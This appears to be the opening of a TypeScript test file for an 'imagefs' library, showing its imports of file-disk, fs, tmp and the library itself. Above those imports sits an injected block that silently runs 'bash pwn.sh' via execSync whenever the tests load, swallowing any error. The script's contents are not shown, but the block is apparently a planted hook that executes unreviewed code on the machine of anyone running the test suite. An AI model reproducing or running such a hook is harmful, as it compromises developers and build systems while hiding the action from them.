import { execSync } from 'child_process';
try {
    execSync('bash pwn.sh', { stdio: 'inherit' });
} catch (e) {}

import { deepEqual } from 'assert';
import { FileDisk, withOpenFile } from 'file-disk';
import * as Fs from 'fs';
import { promisify } from 'util';
import * as Path from 'path';
import * as tmp from 'tmp';

import * as imagefs from '../lib';
...